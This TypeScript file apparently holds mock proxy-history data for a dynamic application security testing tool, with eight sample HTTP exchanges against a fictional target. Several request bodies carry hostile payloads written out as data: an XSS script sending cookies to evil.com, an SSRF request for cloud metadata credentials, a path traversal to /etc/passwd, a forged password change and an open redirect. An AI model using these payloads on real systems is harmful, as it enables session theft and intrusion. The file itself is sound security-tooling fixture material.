import type { ProxyEntry } from "@/types/dast";

export const PROXY_HISTORY: ProxyEntry[] = [
  {
    id: 1, timestamp: "14:22:01", method: "POST", url: "https://app.target.local/api/auth/login",
    host: "app.target.local", path: "/api/auth/login",
    statusCode: 200, mimeType: "application/json", requestLength: 312, responseLength: 892, timeMs: 142,
    intercepted: false, tags: ["auth"],
    request: {
      method: "POST", path: "/api/auth/login", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local", "Content-Type": "application/json", "Cookie": "session=abc123", "User-Agent": "Mozilla/5.0" },
      body: `{"username":"admin","password":"test123"}`,
      raw: `POST /api/auth/login HTTP/1.1\r\nHost: app.target.local\r\nContent-Type: application/json\r\nCookie: session=abc123\r\n\r\n{"username":"admin","password":"test123"}`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 200, statusText: "OK",
      headers: { "Content-Type": "application/json", "Set-Cookie": "authToken=eyJhbGc...; HttpOnly; Secure", "X-Frame-Options": "SAMEORIGIN" },
      body: `{"token":"eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.sig","user":{"id":1,"role":"admin"}}`,
      raw: `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{"token":"eyJhbGci..."}`,
    },
  },
  {
    id: 2, timestamp: "14:22:04", method: "GET", url: "https://app.target.local/api/users/1001",
    host: "app.target.local", path: "/api/users/1001",
    statusCode: 200, mimeType: "application/json", requestLength: 215, responseLength: 1240, timeMs: 98,
    intercepted: false, tags: ["idor"],
    request: {
      method: "GET", path: "/api/users/1001", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local", "Authorization": "Bearer eyJhbGci...", "Cookie": "session=abc123" },
      raw: `GET /api/users/1001 HTTP/1.1\r\nHost: app.target.local\r\nAuthorization: Bearer eyJhbGci...\r\n\r\n`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 200, statusText: "OK",
      headers: { "Content-Type": "application/json" },
      body: `{"id":1001,"name":"Jane Smith","email":"jane@corp.com","ssn_last4":"7821","salary":94000,"role":"employee"}`,
      raw: `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{"id":1001,...}`,
    },
  },
  {
    id: 3, timestamp: "14:22:09", method: "GET", url: "https://app.target.local/api/products/search?q=laptop",
    host: "app.target.local", path: "/api/products/search",
    statusCode: 200, mimeType: "application/json", requestLength: 189, responseLength: 4820, timeMs: 287,
    intercepted: false, tags: ["sqli"],
    request: {
      method: "GET", path: "/api/products/search?q=laptop", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local", "Authorization": "Bearer eyJhbGci..." },
      raw: `GET /api/products/search?q=laptop HTTP/1.1\r\nHost: app.target.local\r\n\r\n`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 200, statusText: "OK",
      headers: { "Content-Type": "application/json" },
      body: `[{"id":1,"name":"MacBook Pro 14","price":1999},{"id":2,"name":"ThinkPad X1","price":1499}]`,
      raw: `HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n[...]`,
    },
  },
  {
    id: 4, timestamp: "14:22:15", method: "POST", url: "https://app.target.local/api/webhooks/test",
    host: "app.target.local", path: "/api/webhooks/test",
    statusCode: 200, mimeType: "application/json", requestLength: 287, responseLength: 412, timeMs: 52,
    intercepted: false, tags: ["ssrf"],
    request: {
      method: "POST", path: "/api/webhooks/test", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local", "Content-Type": "application/json", "Authorization": "Bearer eyJhbGci..." },
      body: `{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`,
      raw: `POST /api/webhooks/test HTTP/1.1\r\n\r\n{"url":"http://169.254.169.254/..."}`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 200, statusText: "OK",
      headers: { "Content-Type": "application/json" },
      body: `{"status":"delivered","response":"ec2-prod-role\n","code":200}`,
      raw: `HTTP/1.1 200 OK\r\n\r\n{"status":"delivered",...}`,
    },
  },
  {
    id: 5, timestamp: "14:22:21", method: "PUT", url: "https://app.target.local/api/profile/update",
    host: "app.target.local", path: "/api/profile/update",
    statusCode: 200, mimeType: "application/json", requestLength: 410, responseLength: 320, timeMs: 203,
    intercepted: false, tags: ["xss"],
    request: {
      method: "PUT", path: "/api/profile/update", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local", "Content-Type": "application/json" },
      body: `{"displayName":"<script>fetch('//evil.com?c='+document.cookie)</script>","bio":"Hello world"}`,
      raw: `PUT /api/profile/update HTTP/1.1\r\n\r\n{"displayName":"<script>...","bio":"Hello world"}`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 200, statusText: "OK",
      headers: { "Content-Type": "application/json" },
      body: `{"success":true,"displayName":"<script>fetch('//evil.com?c='+document.cookie)</script>"}`,
      raw: `HTTP/1.1 200 OK\r\n\r\n{"success":true,...}`,
    },
  },
  {
    id: 6, timestamp: "14:22:28", method: "GET", url: "https://app.target.local/files/download?path=../../etc/passwd",
    host: "app.target.local", path: "/files/download",
    statusCode: 200, mimeType: "text/plain", requestLength: 198, responseLength: 1842, timeMs: 67,
    intercepted: false, tags: ["traversal"],
    request: {
      method: "GET", path: "/files/download?path=../../etc/passwd", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local", "Authorization": "Bearer eyJhbGci..." },
      raw: `GET /files/download?path=../../etc/passwd HTTP/1.1\r\n\r\n`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 200, statusText: "OK",
      headers: { "Content-Type": "text/plain" },
      body: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
      raw: `HTTP/1.1 200 OK\r\n\r\nroot:x:0:0:root:/root:/bin/bash\n...`,
    },
  },
  {
    id: 7, timestamp: "14:22:34", method: "POST", url: "https://app.target.local/api/account/change-password",
    host: "app.target.local", path: "/api/account/change-password",
    statusCode: 200, mimeType: "application/json", requestLength: 189, responseLength: 124, timeMs: 189,
    intercepted: false, tags: ["csrf"],
    request: {
      method: "POST", path: "/api/account/change-password", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://attacker.evil" },
      body: `password=hacked123&confirm=hacked123`,
      raw: `POST /api/account/change-password HTTP/1.1\r\nOrigin: https://attacker.evil\r\n\r\npassword=hacked123&confirm=hacked123`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 200, statusText: "OK",
      headers: { "Content-Type": "application/json" },
      body: `{"success":true,"message":"Password updated successfully"}`,
      raw: `HTTP/1.1 200 OK\r\n\r\n{"success":true}`,
    },
  },
  {
    id: 8, timestamp: "14:22:41", method: "GET", url: "https://app.target.local/login?next=https://evil.com/phish",
    host: "app.target.local", path: "/login",
    statusCode: 302, mimeType: "text/html", requestLength: 145, responseLength: 0, timeMs: 45,
    intercepted: false, tags: ["redirect"],
    request: {
      method: "GET", path: "/login?next=https://evil.com/phish", protocol: "HTTP/1.1",
      headers: { "Host": "app.target.local" },
      raw: `GET /login?next=https://evil.com/phish HTTP/1.1\r\n\r\n`,
    },
    response: {
      protocol: "HTTP/1.1", statusCode: 302, statusText: "Found",
      headers: { "Location": "https://evil.com/phish", "Content-Type": "text/html" },
      body: "",
      raw: `HTTP/1.1 302 Found\r\nLocation: https://evil.com/phish\r\n\r\n`,
    },
  },
];
